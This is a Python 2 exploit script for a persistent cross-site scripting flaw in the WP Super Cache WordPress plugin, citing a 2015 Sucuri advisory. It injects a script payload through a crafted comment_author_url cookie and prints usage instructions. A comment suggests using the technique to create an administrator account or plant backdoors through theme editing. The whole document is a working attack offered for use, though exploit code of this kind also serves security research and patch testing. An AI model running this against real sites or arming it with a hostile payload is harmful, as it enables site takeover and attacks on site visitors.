#@name   wp-super-cache-xss-exploit.py
#@author Yaseng <yaseng@uauc.net >
#@team   Baidu X-Team 
#@link   https://blog.sucuri.net/2015/04/security-advisory-persistent-xss-in-wp-super-cache.html    
#@exp    wp-super-cache-xss-exploit.py  http://127.0.0.1/cms/wordpress


import urllib2,sys,time,hashlib

def get(url,cookie=""):
 try:
    opener = urllib2.build_opener()
    opener.addheaders.append(('Cookie', cookie))
    opener.addheaders.append(('Referer', url))
    r = opener.open(url,timeout=60)
    return r.read();
 except urllib2.HTTPError, error:
       print  error.read()
       return error.read()
   

if __name__ == '__main__':
     if len(sys.argv) > 1 :
         poc="<script> alert(0) </script> " 
         #a new administrator account to the site, injecting backdoors by using WordPress theme edition tools, etc.
         url=sys.argv[1]
         rand_str=hashlib.md5(str(time.time())).hexdigest()
         cookie="comment_author_url_"+rand_str+"="+poc+rand_str
         #print cookie
         get(url,cookie)
     else:
         print  "Usage: wp-super-cache-xss-exploit.py  uri \r\n "
